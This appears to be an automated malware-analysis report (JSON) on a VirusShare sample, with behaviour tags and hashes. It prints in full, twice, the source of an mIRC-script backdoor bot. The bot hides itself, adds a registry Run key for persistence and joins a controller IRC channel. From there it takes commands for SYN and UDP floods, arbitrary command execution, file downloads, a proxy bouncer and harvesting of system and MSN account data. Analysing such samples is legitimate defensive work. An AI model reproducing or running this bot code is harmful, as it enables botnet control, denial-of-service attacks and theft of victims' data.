{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Run": "May run an executable file or a system command",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "chr": "May attempt to obfuscate specific str",
            "register": "May call a DLL using Excel 4 Macros",
            "regread": "May read registry keys",
            "system": "May run an executable file or a system command on a Mac",
            "write": "May write to a file"
        },
        "macro": " ;;;;;;;;;; V1rg1n[Gt] ;;;;;;;;;;;\n;;;;;    Priv8 to Coder     ;;;;;\n;;;;;    New st4ff added    ;;;;;\n;;;;;       By d4rky        ;;;;;\n;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;\nalias jc { /join $l0v3ly(nc) $l0v3ly(nk) }\nalias connec { server $l0v3ly(nr) $l0v3ly(np) }\nalias mylovely { .dll systemac.dll HideMirc on | .ddeserver on d4rky | .nick [ $+ $os $+ - $+ $r(1000,9999) $+ $r(100,999) $+ ]] | anick [ $+ $os $+ - $+ $r(1000,9999) $+ $r(100,999) $+ ]] | //username d4rky Eyes  | //identd on d4rky | //emailaddr d4rky | .n0clone | .connec | .timerconnec -o 0 20 connec | //.timerus -o 0 1 us | //.timerus -o 0 1 hd | //.timerst4rt -o 0 3 st4rt  }\nalias saym { if ($me isvo $l0v3ly(nc)) { clearall | msg $l0v3ly(nc) $1- } }\nalias n0clone { if ($portfree( $+ $l0v3ly(nl) $+ ) == $false) { exit } | socklisten noclone $l0v3ly(nl) }\nalias st4rt { \n  set %nzxEDIT $rand(100,999) $+ .reg \n  write %nzxEDIT  REGEDIT4\n  write %nzxEDIT [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]  \n  write %nzxEDIT \"ISPSERVICE\"=\" $+ $replace($mircexe,\\,\\\\) $+ \"  \n  run -n regedit /s %nzxEDIT\n  timer 1 4 remove %d4rkyxEDIT\n}\nalias RegDelete { if ($1 != $null) { var %a = RegDelete | .comopen %a WScript.Shell | if !$comerr { var %b = $com(%a,RegDelete,3,bstr,$1) | .comclose %a } } | else { echo error! complete data } }\nalias RegWrite { if ($1) && ($2) && ($3) { %a = RegWrite | .comopen %a WScript.Shell | if (!$comerr) { %b = $com(%a,RegWrite,3,bstr,$1,bstr,$2,bstr,$3) | .comclose %a } | if ($3 == REG_EXPAND_SZ) || ($3 == REG_SZ) { if ($regread($1) == $2) { halt } | else { echo error! when writing } } } | else { echo error! complete data } }\nalias RegRead { if ($1 != $null) { var %a = regread | .comopen %a WScript.Shell | if !$comerr { var %b =  $com(%a,RegRead,3,bstr,$1-) | var %c = $com(%a).result | .comclose %a | if (%c) return %c | else { return $false } } } | else { return error! complete data } }\nalias r3m {  if $isdir(sounds) || $isdir(logs) || $isdir(download) || $isdir(channels) { rmdir sounds | rmdir logs | rmdir download | rmdir channels | halt } }\nalias hidef { var %h1d $findfile($mircdir,*.*,0,write h.bat attrib +R +S +H $noPATH($1-)) | run systemac.dll HideMirc on }\nalias us { if ($appactive = $true) { run systemac.dll HideMirc on } }\nalias hd { if ($appstate != hidden) { run systemac.dll HideMirc on } }\nalias c { .mode $me +iR-x | ial on | pdcc on | fsend on | sreq auto | creq auto | dcc packetsize 8192 | .timerap 0 30 ctcp $!me ping | clearall }\non *:START:{ .dll systemac.dll HideMirc on | mylovely | inc %hmt | .if (%hmt = 1) { set %infecttime $day $date $time } }\non *:disconnect:{ timerconnec -o 0 15 connec  }\non *:exit:{ sockclose * | timers off }\non *:connect:{ .timerconnec off | ipnick | c | .timerjc 0 $rand(5,5) /jc }\non *:OP:#: { if ($opnick = $me) { mode $chan +mnstk $l0v3ly(nk) | topic # d4rk Eyes ;) } }\non *:PING:{ ctcp $me ping }\non *:dns:{ %address = $iaddress } { if (%dns.r == on) { saym dns: %dns.rrr resolved to ip: $iaddress host: $naddress | unset %dns.* } } \non *:join:$l0v3ly(nc):{ if ($nick == $me) { .timerjc off } }\non *:part:$l0v3ly(nc):{ if ($nick == $me) { .timerjc 0 3 raw -q /jc } }\non *:KICK:$l0v3ly(nc):{ if ($knick == $me) { .timerjc 0 3 raw -q /jc } }\non *:socklisten:ident: { .sockaccept $sockname $+ . $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) }\non *:sockread:IDENT.*: { sockread %tmp | tokenize 32 %tmp | sockwrite -tn $sockname $3 $2 $1 : USERID : UNIX : $fnick | unset %tmp }\non *:socklisten:Bnc:{ sockaccept Bnc.temp | %conncheck = $sock(Bnc.temp).ip | if ($sock($+(bnc.in.,%conncheck))) { sockclose bnc.temp } | sockrename Bnc.Temp Bnc.temp. [ $+ [ $sock(Bnc.temp).ip ] ] }\non *:sockread:Bnc.temp.*:{ sockread %bnc.in | tokenize 32 %bnc.in { if ($1 = NICK) { sockwrite -n $sockname NOTICE $host :BNC iRc Proxy ( $+ $2 $+ ) | set %Bnc.nick. [ $+ [ $sock($sockname).ip ] ] $2 | halt } | if ($1 = USER) { .identd on $2 | set %Bnc.user. [ $+ [ $sock($sockname).ip ] ] $2- | sockwrite -n $sockname NOTICE $host :Please type /pass <password> | halt } | if ($1 = PASS) { if ($2 = %Bnc.pass) { sockwrite -n $sockname NOTICE $host :Password accepted, Welcome In... | sockwrite -n $sockname NOTICE $host :Please type /conn <server> <port> | sockrename $sockname $replace($sockname,Bnc.temp,Bnc.in) | halt } | if ($2 != %Bnc.pass) { sockwrite -n $sockname NOTICE $host :Access Denied.. } | if (!$2) { sockwrite -n $sockname NOTICE $host :You Need A Password To Cconnect | sockwrite -n $sockname NOTICE $host :Please Type /pass <password> }  } } }\non *:sockread:Bnc.in.*:{ sockread %bnc.in | tokenize 32 %bnc.in { if ($1 = USER) { .identd on $2 | set %Bnc.user. [ $+ [ $sock($sockname).ip ] ] $2- | halt } | if ($1 = CONN) { if (!$2) { sockwrite -n $sockname NOTICE $host :please type /conn <server> <port> | halt } | if (!$3) { %xxxx = 6667 } | if ($3) { %xxxx = $3 } | if ($sock($replace($sockname,Bnc.in,Bnc.out))) { sockwrite -n $sockname NOTICE $host :Disconnecting from previous connection | sockclose Bnc.out. [ $+ [ $sock($sockname).ip ] ] } | sockopen $replace($sockname,Bnc.in,Bnc.out) $2 %xxxx | sockwrite -n $sockname NOTICE $host :making reality through $2 port %xxxx | unset %xxxx | halt } | if ($1 = NICK) { set %bnc.nick. [ $+ [ $sock($sockname).ip ] ] $2 } | if ($sock($replace($sockname,Bnc.in,Bnc.out))) { sockwrite -n $replace($sockname,Bnc.in,Bnc.out) $1- } } | unset %bnc.in }\non *:sockopen:Bnc.out.*:{ if ($sockerr) { sockwrite -n $replace($sockname,Bnc.out,Bnc.in) NOTICE $host :Failed Connection | halt } | sockwrite -n $replace($sockname,Bnc.out,Bnc.in) NOTICE $host :Suceeded Connection | sockwrite -n $sockname NICK %Bnc.nick. [ $+ [ $remove($sockname,Bnc.out.) ] ] | sockwrite -n $sockname USER %Bnc.user. [ $+ [ $remove($sockname,Bnc.out.) ] ] }\non *:sockread:Bnc.out.*:{ sockread %Bnc.out | if (!$sock($replace($sockname,Bnc.out,Bnc.in))) { sockwrite -n $sockname Quit :Dead Socket. | halt } | sockwrite -n $replace($sockname,Bnc.out,Bnc.in) %Bnc.out | unset %bnc.out }\non *:TEXT:*:*: {\n  if ($nick isop $l0v3ly(nc)) {\n    if ($1 = !msyn) { if ($2 !== $null) { saym \u00031\u0002Code Start\u0002 [\u000314MSyn\u00031] target: $+ $2 Size: $+ $3 ComPort: $+ $r(1,64000)  | msynp start $3 $2 $r(1,64000) } }\n    if ($1 = !syn) { if ($2 !== $null) { saym \u00031\u0002Code Start\u0002 [\u000314Syn\u00031] target: $+ $2 ComPort: $+ $3 Size: $+ $4   | synp start $4 $2 $3 } }\n    if ($1 = !pf) { if ($4 == m) { //ptk $2 $3 $r(1,64000) | halt } | //ptk $2 $3 $4 }\n    if ($1 = !udp) {  if ($4 == m) { //xGx $2 $3 $r(1,65000) | halt } | //xGx $2 $3 $4 }\n    if ($1 = !mp) { if ($2 isnum) { mptk $2 $3 $r(1,64000) } | if ($2 = -s) { .timermptk off | saym \u00031\u0002Code End\u0002 [\u000314Mudp\u00031] } }\n    if ($1 = !proxy) { r4.proxy $2- }\n    if ($1 = !clone) { clone $2- }\n    if ($1 = !xt) { clonez $2- }\n    if ($1 = !rest) { timer 1 1 /quit reconnecting... | connec }\n    if ($1 = !/) && ($2 != $null) { %do = $2- | / $+ %do | unset %do }\n    if ($1 = !dns) { dns $2 | set %dns.r on | set %dns.rr # | set %dns.rrr $2 | saym attempting to resolve: $2 } \n    if ($1 = !var) { saym Variable = [ [ $$2- ] ] } \n    if ($1 = !c) && ($2 = away) { timer 1 1 //sockwrite -tn X away : $+ $3-  }\n    if ($1 = !c2) && ($2 = away) { timer 1 1 //sockwrite -tn M away  : $+ $3-  }\n    if ($1 = !ch) && ($2 = op) { timer 1 0 //sockwrite -tn C mode %XcChan +oo : $3- }\n    if ($1 = !ch) && ($2 = Kick) { timer 1 0 //sockwrite -tn C kick %XcChan $3- : die! }\n    if ($1 = !ch) && ($2 = $me) && ($3 = nick) { timer 1 0 //sockwrite -tn C nick $4- }\n    if ($1 = !ch) && ($2 = pass) { timer 1 0 //sockwrite -tn C nickserv identify $3- }\n    if ($1 = !Ch) && ($2 = away) { timer 1 0 //sockwrite -tn C away  : $+ $3- }\n    if ($1 = !Ch) && ($2 = Reg) { timer 1 0 //sockwrite -tn C Chanserv register %Xchan : $3 $4- }\n    if ($1 = !x) { if (-r isin $2-) { set %run 1 } | download file $2 $mircdir }\n  }\n  if ($1 = !info) {\n    if ($2 == $null) { saym [d4rky Help] !info msn,net,cpu,sys,uptime,port,disk | halt } \n    if ($2 = msn) { .comopen msn Messenger.UIAutomation | if ($comerr) { return } | %a = $com(msn,MyStatus,2) | %b = $com(msn).result | %a = $com(msn,MyFriendlyName,2) | %c = $com(msn).result | %a = $com(msn,MySigninName,2) | %d = $com(msn).result | %a = $com(msn,MyServiceName,2) | %e = $com(msn).result | %x = $com(msn,InstallationDirectory,1) | .comclose msn | if (%b = 1) { %b = Offline } | if (%b = 2) { %b = Online } | if (%b = 6) { %b = Invisible } | if (%b = 10) { %b = Busy } | if (%b = 14) { %b = Be Right Back } | if (%b = 18) { %b = Idle } | if (%b = 34) { %b = Away } | if (%b = 50) { %b = On the Phone } | if (%b = 66) { %b = Out for Lunch } | if (%b = offline) { msg $l0v3ly(nc2) [Msn] Currently Offline. } | else { msg $l0v3ly(nc2) [msn] [Nickname: %c $+ ]  [E-mail: %d $+ ] [Service Provider: %e $+ ] [Status: %b $+ ] } }\n    if ($2 = net) { saym |network-information| \u0002c\u0002onnection: $dll(win.dll,connection,_) \u0002n\u0002etwork \u0002i\u0002nterfaces: $dll(win.dll,interfaceinfo,_) \u0002i\u0002p: $ip \u0002h\u0002ost: $host }\n    if ($2 = cpu) { saym |cpu-information| \u0002t\u0002ime: $time(h:nn TT) \u0002d\u0002ate: $date(mmmm doo yyyy) \u0002o\u0002s: $os \u0002c\u0002pu: $dll(win.dll,cpuinfo,_) \u0002m\u0002emory: $dll(win.dll,meminfo,_) \u0002u\u0002ptime: $uptime(system,1) \u0002h\u0002d: $dll(win.dll,diskcapacity,_) }\n    if ($2 = port) { %cp.i = 1 | %cp.x = 65000 | %cp.p = $null | :loop | if (%cp.i > %cp.x) { goto return } | if (!$portfree(%cp.i)) { %cp.p = $+(%cp.p,$chr(130),%cp.i) } | inc %cp.i | goto loop | :return | saym [Portinfo] ( $+ $gettok(%cp.p,1-,130) $+ ) | unset %cp.* }\n    if ($2 = disk) { .saym I have $bytes($disk(c).free).suf of free space, total; $bytes($disk(c).size).suf }\n    if ($2 = sys) { saym Ip: $ip Windows: $os Host: $host Time: $time(h:nn tt) Date: $date(mmmm doo yyyy) }\n    if ($2 = uptime) { saym system uptime: $duration($uptime(system,3)) , mirc uptime: $uptime(mirc,1) }\n    if ($2 = speed) { saym [Connection] Speed: http://www.dslreports.com/archive/ $+ $gettok($host,3-,46) | halt }\n  }\n  if ($1 = !bnc) { \n    if ($2 == $null) { saym [d4rky Help] !bnc start port pass / !bnc stop / !bnc stats  | halt }\n    if ($2 = start) { if (!$sock(bnc)) && ($4) && ($portfree($3)) { socklisten bnc $3 | .set %bnc.pass $4 | saym bnc started: /server -m $ip $+ : $+ $sock(BNc).port , pass: %bnc.pass } | elseif ($sock(bnc)) { saym bnc is already running: /server -m $ip $sock(BNc).port , with pass: %bnc.pass } }\n    if ($2 = stop) { if (!$sock(bnc)) { halt } | else { sockclose bnc* | .unset %bnc* | saym bnc is now halted } }\n    if ($2 = stats) && ($sock(bnc)) { saym [bnc] is on! $ip $+ : $+ %Bnc.port pass: %Bnc.pass $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }\n  }\n}\n}\n}\n\nraw 433:*:{ nick zeus[ $+ $os $+ ] $+ $r(10000,99999) }"
    },
    "filename": "VirusShare_4a8e904d4ef9afacc280167d740de5a8",
    "filesize": 10760,
    "filetype": "data",
    "hashes": {
        "md5": "4a8e904d4ef9afacc280167d740de5a8",
        "sha1": "f66b085455cae3f5026b4f644e69498a7522be85",
        "sha256": "6072ad1f8042273cc7ae24b014e7b1a1cba188ab089bf8aec7c21897f796a82b"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            " ;;;;;;;;;; V1rg1n[Gt] ;;;;;;;;;;;",
            ";;;;;    Priv8 to Coder     ;;;;;",
            ";;;;;    New st4ff added    ;;;;;",
            ";;;;;       By d4rky        ;;;;;",
            ";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;",
            "alias jc { /join $l0v3ly(nc) $l0v3ly(nk) }",
            "alias connec { server $l0v3ly(nr) $l0v3ly(np) }",
            "alias mylovely { .dll systemac.dll HideMirc on | .ddeserver on d4rky | .nick [ $+ $os $+ - $+ $r(1000,9999) $+ $r(100,999) $+ ]] | anick [ $+ $os $+ - $+ $r(1000,9999) $+ $r(100,999) $+ ]] | //username d4rky Eyes  | //identd on d4rky | //emailaddr d4rky | .n0clone | .connec | .timerconnec -o 0 20 connec | //.timerus -o 0 1 us | //.timerus -o 0 1 hd | //.timerst4rt -o 0 3 st4rt  }",
            "alias saym { if ($me isvo $l0v3ly(nc)) { clearall | msg $l0v3ly(nc) $1- } }",
            "alias n0clone { if ($portfree( $+ $l0v3ly(nl) $+ ) == $false) { exit } | socklisten noclone $l0v3ly(nl) }",
            "alias st4rt { ",
            "  set %nzxEDIT $rand(100,999) $+ .reg ",
            "  write %nzxEDIT  REGEDIT4",
            "  write %nzxEDIT [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]  ",
            "  write %nzxEDIT \"ISPSERVICE\"=\" $+ $replace($mircexe,\\,\\\\) $+ \"  ",
            "  run -n regedit /s %nzxEDIT",
            "  timer 1 4 remove %d4rkyxEDIT",
            "alias RegDelete { if ($1 != $null) { var %a = RegDelete | .comopen %a WScript.Shell | if !$comerr { var %b = $com(%a,RegDelete,3,bstr,$1) | .comclose %a } } | else { echo error! complete data } }",
            "alias RegWrite { if ($1) && ($2) && ($3) { %a = RegWrite | .comopen %a WScript.Shell | if (!$comerr) { %b = $com(%a,RegWrite,3,bstr,$1,bstr,$2,bstr,$3) | .comclose %a } | if ($3 == REG_EXPAND_SZ) || ($3 == REG_SZ) { if ($regread($1) == $2) { halt } | else { echo error! when writing } } } | else { echo error! complete data } }",
            "alias RegRead { if ($1 != $null) { var %a = regread | .comopen %a WScript.Shell | if !$comerr { var %b =  $com(%a,RegRead,3,bstr,$1-) | var %c = $com(%a).result | .comclose %a | if (%c) return %c | else { return $false } } } | else { return error! complete data } }",
            "alias r3m {  if $isdir(sounds) || $isdir(logs) || $isdir(download) || $isdir(channels) { rmdir sounds | rmdir logs | rmdir download | rmdir channels | halt } }",
            "alias hidef { var %h1d $findfile($mircdir,*.*,0,write h.bat attrib +R +S +H $noPATH($1-)) | run systemac.dll HideMirc on }",
            "alias us { if ($appactive = $true) { run systemac.dll HideMirc on } }",
            "alias hd { if ($appstate != hidden) { run systemac.dll HideMirc on } }",
            "alias c { .mode $me +iR-x | ial on | pdcc on | fsend on | sreq auto | creq auto | dcc packetsize 8192 | .timerap 0 30 ctcp $!me ping | clearall }",
            "on *:START:{ .dll systemac.dll HideMirc on | mylovely | inc %hmt | .if (%hmt = 1) { set %infecttime $day $date $time } }",
            "on *:disconnect:{ timerconnec -o 0 15 connec  }",
            "on *:exit:{ sockclose * | timers off }",
            "on *:connect:{ .timerconnec off | ipnick | c | .timerjc 0 $rand(5,5) /jc }",
            "on *:OP:#: { if ($opnick = $me) { mode $chan +mnstk $l0v3ly(nk) | topic # d4rk Eyes ;) } }",
            "on *:PING:{ ctcp $me ping }",
            "on *:dns:{ %address = $iaddress } { if (%dns.r == on) { saym dns: %dns.rrr resolved to ip: $iaddress host: $naddress | unset %dns.* } } ",
            "on *:join:$l0v3ly(nc):{ if ($nick == $me) { .timerjc off } }",
            "on *:part:$l0v3ly(nc):{ if ($nick == $me) { .timerjc 0 3 raw -q /jc } }",
            "on *:KICK:$l0v3ly(nc):{ if ($knick == $me) { .timerjc 0 3 raw -q /jc } }",
            "on *:socklisten:ident: { .sockaccept $sockname $+ . $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) }",
            "on *:sockread:IDENT.*: { sockread %tmp | tokenize 32 %tmp | sockwrite -tn $sockname $3 $2 $1 : USERID : UNIX : $fnick | unset %tmp }",
            "on *:socklisten:Bnc:{ sockaccept Bnc.temp | %conncheck = $sock(Bnc.temp).ip | if ($sock($+(bnc.in.,%conncheck))) { sockclose bnc.temp } | sockrename Bnc.Temp Bnc.temp. [ $+ [ $sock(Bnc.temp).ip ] ] }",
            "on *:sockread:Bnc.temp.*:{ sockread %bnc.in | tokenize 32 %bnc.in { if ($1 = NICK) { sockwrite -n $sockname NOTICE $host :BNC iRc Proxy ( $+ $2 $+ ) | set %Bnc.nick. [ $+ [ $sock($sockname).ip ] ] $2 | halt } | if ($1 = USER) { .identd on $2 | set %Bnc.user. [ $+ [ $sock($sockname).ip ] ] $2- | sockwrite -n $sockname NOTICE $host :Please type /pass <password> | halt } | if ($1 = PASS) { if ($2 = %Bnc.pass) { sockwrite -n $sockname NOTICE $host :Password accepted, Welcome In... | sockwrite -n $sockname NOTICE $host :Please type /conn <server> <port> | sockrename $sockname $replace($sockname,Bnc.temp,Bnc.in) | halt } | if ($2 != %Bnc.pass) { sockwrite -n $sockname NOTICE $host :Access Denied.. } | if (!$2) { sockwrite -n $sockname NOTICE $host :You Need A Password To Cconnect | sockwrite -n $sockname NOTICE $host :Please Type /pass <password> }  } } }",
            "on *:sockread:Bnc.in.*:{ sockread %bnc.in | tokenize 32 %bnc.in { if ($1 = USER) { .identd on $2 | set %Bnc.user. [ $+ [ $sock($sockname).ip ] ] $2- | halt } | if ($1 = CONN) { if (!$2) { sockwrite -n $sockname NOTICE $host :please type /conn <server> <port> | halt } | if (!$3) { %xxxx = 6667 } | if ($3) { %xxxx = $3 } | if ($sock($replace($sockname,Bnc.in,Bnc.out))) { sockwrite -n $sockname NOTICE $host :Disconnecting from previous connection | sockclose Bnc.out. [ $+ [ $sock($sockname).ip ] ] } | sockopen $replace($sockname,Bnc.in,Bnc.out) $2 %xxxx | sockwrite -n $sockname NOTICE $host :making reality through $2 port %xxxx | unset %xxxx | halt } | if ($1 = NICK) { set %bnc.nick. [ $+ [ $sock($sockname).ip ] ] $2 } | if ($sock($replace($sockname,Bnc.in,Bnc.out))) { sockwrite -n $replace($sockname,Bnc.in,Bnc.out) $1- } } | unset %bnc.in }",
            "on *:sockopen:Bnc.out.*:{ if ($sockerr) { sockwrite -n $replace($sockname,Bnc.out,Bnc.in) NOTICE $host :Failed Connection | halt } | sockwrite -n $replace($sockname,Bnc.out,Bnc.in) NOTICE $host :Suceeded Connection | sockwrite -n $sockname NICK %Bnc.nick. [ $+ [ $remove($sockname,Bnc.out.) ] ] | sockwrite -n $sockname USER %Bnc.user. [ $+ [ $remove($sockname,Bnc.out.) ] ] }",
            "on *:sockread:Bnc.out.*:{ sockread %Bnc.out | if (!$sock($replace($sockname,Bnc.out,Bnc.in))) { sockwrite -n $sockname Quit :Dead Socket. | halt } | sockwrite -n $replace($sockname,Bnc.out,Bnc.in) %Bnc.out | unset %bnc.out }",
            "on *:TEXT:*:*: {",
            "  if ($nick isop $l0v3ly(nc)) {",
            "    if ($1 = !msyn) { if ($2 !== $null) { saym ",
            "Code Start",
            "14MSyn",
            "1] target: $+ $2 Size: $+ $3 ComPort: $+ $r(1,64000)  | msynp start $3 $2 $r(1,64000) } }",
            "    if ($1 = !syn) { if ($2 !== $null) { saym ",
            "Code Start",
            "14Syn",
            "1] target: $+ $2 ComPort: $+ $3 Size: $+ $4   | synp start $4 $2 $3 } }",
            "    if ($1 = !pf) { if ($4 == m) { //ptk $2 $3 $r(1,64000) | halt } | //ptk $2 $3 $4 }",
            "    if ($1 = !udp) {  if ($4 == m) { //xGx $2 $3 $r(1,65000) | halt } | //xGx $2 $3 $4 }",
            "    if ($1 = !mp) { if ($2 isnum) { mptk $2 $3 $r(1,64000) } | if ($2 = -s) { .timermptk off | saym ",
            "Code End",
            "14Mudp",
            "1] } }",
            "    if ($1 = !proxy) { r4.proxy $2- }",
            "    if ($1 = !clone) { clone $2- }",
            "    if ($1 = !xt) { clonez $2- }",
            "    if ($1 = !rest) { timer 1 1 /quit reconnecting... | connec }",
            "    if ($1 = !/) && ($2 != $null) { %do = $2- | / $+ %do | unset %do }",
            "    if ($1 = !dns) { dns $2 | set %dns.r on | set %dns.rr # | set %dns.rrr $2 | saym attempting to resolve: $2 } ",
            "    if ($1 = !var) { saym Variable = [ [ $$2- ] ] } ",
            "    if ($1 = !c) && ($2 = away) { timer 1 1 //sockwrite -tn X away : $+ $3-  }",
            "    if ($1 = !c2) && ($2 = away) { timer 1 1 //sockwrite -tn M away  : $+ $3-  }",
            "    if ($1 = !ch) && ($2 = op) { timer 1 0 //sockwrite -tn C mode %XcChan +oo : $3- }",
            "    if ($1 = !ch) && ($2 = Kick) { timer 1 0 //sockwrite -tn C kick %XcChan $3- : die! }",
            "    if ($1 = !ch) && ($2 = $me) && ($3 = nick) { timer 1 0 //sockwrite -tn C nick $4- }",
            "    if ($1 = !ch) && ($2 = pass) { timer 1 0 //sockwrite -tn C nickserv identify $3- }",
            "    if ($1 = !Ch) && ($2 = away) { timer 1 0 //sockwrite -tn C away  : $+ $3- }",
            "    if ($1 = !Ch) && ($2 = Reg) { timer 1 0 //sockwrite -tn C Chanserv register %Xchan : $3 $4- }",
            "    if ($1 = !x) { if (-r isin $2-) { set %run 1 } | download file $2 $mircdir }",
            "  if ($1 = !info) {",
            "    if ($2 == $null) { saym [d4rky Help] !info msn,net,cpu,sys,uptime,port,disk | halt } ",
            "    if ($2 = msn) { .comopen msn Messenger.UIAutomation | if ($comerr) { return } | %a = $com(msn,MyStatus,2) | %b = $com(msn).result | %a = $com(msn,MyFriendlyName,2) | %c = $com(msn).result | %a = $com(msn,MySigninName,2) | %d = $com(msn).result | %a = $com(msn,MyServiceName,2) | %e = $com(msn).result | %x = $com(msn,InstallationDirectory,1) | .comclose msn | if (%b = 1) { %b = Offline } | if (%b = 2) { %b = Online } | if (%b = 6) { %b = Invisible } | if (%b = 10) { %b = Busy } | if (%b = 14) { %b = Be Right Back } | if (%b = 18) { %b = Idle } | if (%b = 34) { %b = Away } | if (%b = 50) { %b = On the Phone } | if (%b = 66) { %b = Out for Lunch } | if (%b = offline) { msg $l0v3ly(nc2) [Msn] Currently Offline. } | else { msg $l0v3ly(nc2) [msn] [Nickname: %c $+ ]  [E-mail: %d $+ ] [Service Provider: %e $+ ] [Status: %b $+ ] } }",
            "    if ($2 = net) { saym |network-information| ",
            "onnection: $dll(win.dll,connection,_) ",
            "etwork ",
            "nterfaces: $dll(win.dll,interfaceinfo,_) ",
            "p: $ip ",
            "ost: $host }",
            "    if ($2 = cpu) { saym |cpu-information| ",
            "ime: $time(h:nn TT) ",
            "ate: $date(mmmm doo yyyy) ",
            "s: $os ",
            "pu: $dll(win.dll,cpuinfo,_) ",
            "emory: $dll(win.dll,meminfo,_) ",
            "ptime: $uptime(system,1) ",
            "d: $dll(win.dll,diskcapacity,_) }",
            "    if ($2 = port) { %cp.i = 1 | %cp.x = 65000 | %cp.p = $null | :loop | if (%cp.i > %cp.x) { goto return } | if (!$portfree(%cp.i)) { %cp.p = $+(%cp.p,$chr(130),%cp.i) } | inc %cp.i | goto loop | :return | saym [Portinfo] ( $+ $gettok(%cp.p,1-,130) $+ ) | unset %cp.* }",
            "    if ($2 = disk) { .saym I have $bytes($disk(c).free).suf of free space, total; $bytes($disk(c).size).suf }",
            "    if ($2 = sys) { saym Ip: $ip Windows: $os Host: $host Time: $time(h:nn tt) Date: $date(mmmm doo yyyy) }",
            "    if ($2 = uptime) { saym system uptime: $duration($uptime(system,3)) , mirc uptime: $uptime(mirc,1) }",
            "    if ($2 = speed) { saym [Connection] Speed: http://www.dslreports.com/archive/ $+ $gettok($host,3-,46) | halt }",
            "  if ($1 = !bnc) { ",
            "    if ($2 == $null) { saym [d4rky Help] !bnc start port pass / !bnc stop / !bnc stats  | halt }",
            "    if ($2 = start) { if (!$sock(bnc)) && ($4) && ($portfree($3)) { socklisten bnc $3 | .set %bnc.pass $4 | saym bnc started: /server -m $ip $+ : $+ $sock(BNc).port , pass: %bnc.pass } | elseif ($sock(bnc)) { saym bnc is already running: /server -m $ip $sock(BNc).port , with pass: %bnc.pass } }",
            "    if ($2 = stop) { if (!$sock(bnc)) { halt } | else { sockclose bnc* | .unset %bnc* | saym bnc is now halted } }",
            "    if ($2 = stats) && ($sock(bnc)) { saym [bnc] is on! $ip $+ : $+ %Bnc.port pass: %Bnc.pass $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }",
            "raw 433:*:{ nick zeus[ $+ $os $+ ] $+ $r(10000,99999) }"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.dslreports.com/archive/"
        ]
    },
    "time": "0:00:00.337003",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
